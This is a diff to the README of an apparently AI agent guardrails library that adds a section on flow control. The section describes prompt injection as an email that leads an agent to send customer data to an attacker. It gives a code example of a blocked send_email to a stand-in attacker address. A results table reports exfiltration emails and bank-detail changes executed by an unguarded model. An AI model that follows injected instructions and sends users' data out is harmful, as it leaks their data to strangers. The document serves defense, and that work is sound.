@@ -36,7 +36,9 @@ Write AI agent governance policies in YAML. The engine evaluates every agent act
 - **Extensible** — custom matchers via `@register_matcher` plugin system
 - **Framework adapters** — LangChain, OpenAI Agents SDK, or any platform via `@guard` decorator
 - **Audit log** — JSONL trail of every evaluation, feeds into any observability stack
-- **TrustGate integration** — formally verify that your guardrails catch what they claim
+- **Flow control (0.2)** — tools declare what they read, write and send; once a session has read untrusted content or sensitive data, writes and sends wait for a person's approval of the exact call. Measured on an inbox assistant: 65 exfiltration emails without it, 0 with it. See [Flow control](#flow-control)
+- **Grounded numbers** — flag figures in generated text that no source contains
+- **TrustGate integration** — measure whether your guardrails catch what they claim
 
 ## Quick Start
 
@@ -134,6 +136,43 @@ guardrails validate --config guardrails.yaml
 guardrails inspect --config guardrails.yaml
 guardrails check --config guardrails.yaml --event '{"scope":"input","agent":"test","data":{"content":"hello"}}'
 ```
+
+## Flow control
+
+Matchers catch known phrasings; prompt injection is a sequence, not a phrase. An agent reads
+an email written by a stranger, then sends your customer data where that email said.
+Flow control blocks the sequence, whatever the wording:
+
+```yaml
+tools:
+  read_inbox: {effect: read, returns: [untrusted, sensitive]}
+  read_crm:   {effect: read, returns: sensitive}
+  send_email: {effect: send}
+```
+
+```python
+from theaios.guardrails.flow import FlowGuard
+
+guard = FlowGuard(policy)
+guard.call(session, "read_inbox", read_inbox)                 # session is now tainted
+guard.call(session, "send_email", send_email, to="x@evil.test", body=data)
+# FlowBlocked: send_email: waiting for approval (proposal 3f2a...): the session read
+# untrusted content (read_inbox); a send needs approval; the session read sensitive data ...
+```
+
+A person approves or rejects the frozen call once; code executes exactly what was approved.
+
+| 42 injection runs, gpt-4.1-mini | Unguarded | Flow control |
+|---|---|---|
+| Emails executed to attacker addresses | 65 | 0 |
+| Bank-detail change tickets executed | 30 | 0 |
+| Legitimate sends after reading mail that waited for approval | 0 | all |
+
+The last row is the cost. Method, scenarios and caveats:
+[examples/flow-control](examples/flow-control/). Guide: [docs/flow-control.md](docs/flow-control.md).
+
+Matchers stay useful as detectors (fast, free, deterministic), but they are not the security
+boundary against injection: the declarations are.
 
 ## Why This Library?
 
